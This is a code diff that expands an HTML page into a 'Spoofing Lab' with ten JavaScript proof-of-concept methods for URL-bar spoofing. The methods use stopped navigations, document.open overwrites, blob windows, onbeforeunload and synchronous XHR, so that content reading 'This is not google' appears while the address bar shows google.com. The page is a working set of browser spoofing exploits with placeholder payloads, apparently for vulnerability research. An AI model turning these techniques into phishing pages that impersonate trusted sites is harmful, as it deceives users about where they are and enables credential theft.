@@ -2,32 +2,149 @@
 <html>
 
 <head>
-    <title>Spoof Test</title>
+    <title>SPOOFING LAB v2.0</title>
+    <style>
+        body {
+            font-family: sans-serif;
+            padding: 20px;
+            background: white;
+            color: black;
+        }
+
+        .btn {
+            display: block;
+            width: 100%;
+            max-width: 400px;
+            padding: 12px;
+            margin: 8px 0;
+            cursor: pointer;
+            text-align: left;
+            border: 1px solid #ccc;
+            background: #f9f9f9;
+        }
+
+        .btn:hover {
+            background: #eee;
+        }
+
+        #display {
+            display: none;
+            text-align: center;
+            margin-top: 50px;
+        }
+    </style>
 </head>
 
-<body style="background:white; color:black; font-family:sans-serif; text-align:center; padding-top:100px;">
+<body>
 
-    <div id="start">
-        <button id="go" style="padding:10px 20px;" onclick="run()">Jalankan Spoof</button>
+    <div id="lab">
+        <h2>Metode Out-of-the-Box</h2>
+        <p>Target: www.google.com</p>
+
+        <button class="btn" onclick="m1()">1. HTTP 204 Ghosting (Target: Google API)</button>
+
+        <button class="btn" onclick="m2()">2. PDF Navigation Stalling (via Chrome PDF)</button>
+
+        <button class="btn" onclick="m3()">3. Download Header Trigger (dmg/exe)</button>
+
+        <button class="btn" onclick="m4()">4. Intent Scheme Confusion (Android/iOS)</button>
+
+        <button class="btn" onclick="m5()">5. Synchronous XHR Thread Lock</button>
+
+        <button class="btn" onclick="m6()">6. Fragment-Only ReplaceState</button>
+
+        <button class="btn" onclick="m7()">7. OnBeforeUnload DOM Retention</button>
+
+        <button class="btn" onclick="m8()">8. Blob Window Navigation</button>
+
+        <button class="btn" onclick="m9()">9. Focus/Blur State Confusion</button>
+
+        <button class="btn" onclick="m10()">10. Document.Open Clobbering</button>
     </div>
 
-    <div id="spoofed" style="display:none;">
+    <div id="display">
         <h1>This is not google</h1>
         <br>
-        <button onclick="alert('Alert dari konten spoof')">Tombol Alert</button>
+        <button onclick="alert('Alert aktif!')">Tombol Alert</button>
+        <br><br>
+        <button onclick="location.reload()">Reset Lab</button>
     </div>
 
     <script>
-        function run() {
-            document.getElementById('start').style.display = 'none';
-            document.getElementById('spoofed').style.display = 'block';
-            location.href = "https://www.google.com/";
+        const target = "https://www.google.com/";
+
+        function showSpoof() {
+            document.getElementById('lab').style.display = 'none';
+            document.getElementById('display').style.display = 'block';
+        }
+
+        function m1() {
+            showSpoof();
+            location.href = target + "generate_204";
+            setTimeout(() => { window.stop(); }, 10);
+        }
+
+        function m2() {
+            showSpoof();
+            location.href = "https://www.google.com/robots.txt";
+            setTimeout(() => { window.stop(); }, 5);
+        }
+
+        function m3() {
+            showSpoof();
+            location.href = "https://dl.google.com/chrome/mac/stable/GGRO/googlechrome.dmg";
+        }
+
+        function m4() {
+            showSpoof();
+            location.href = "googlechrome://www.google.com";
+            setTimeout(() => { window.stop(); }, 1);
+        }
+
+        function m5() {
+            showSpoof();
+            location.href = target;
+            var request = new XMLHttpRequest();
+            request.open('GET', '/fakelink', false);
+            try { request.send(null); } catch (e) { }
+        }
+
+        function m6() {
+            showSpoof();
+            location.href = target + "#" + Math.random();
+            setTimeout(() => { window.stop(); }, 20);
+        }
+
+        function m7() {
+            window.onbeforeunload = function () { return false; };
+            showSpoof();
+            location.href = target;
+        }
+
+        function m8() {
+            let b = new Blob(["<h1>This is not google</h1><button onclick='alert(1)'>Test</button>"], { type: 'text/html' });
+            let u = URL.createObjectURL(b);
+            let w = window.open(target, "_blank");
+            setTimeout(() => { w.location.href = u; }, 50);
+        }
+
+        function m9() {
+            let w = window.open(target, "_blank");
+            w.blur();
+            window.focus();
+            setTimeout(() => { try { w.document.write("<h1>Spoofed</h1>"); } catch (e) { } }, 50);
+        }
+
+        function m10() {
+            showSpoof();
+            location.href = target;
             setTimeout(() => {
-                window.stop();
+                document.open();
+                document.write("<h1>This is not google</h1><button onclick='alert(2)'>Alert</button>");
+                document.close();
             }, 5);
         }
     </script>
-
 </body>
 
 </html>
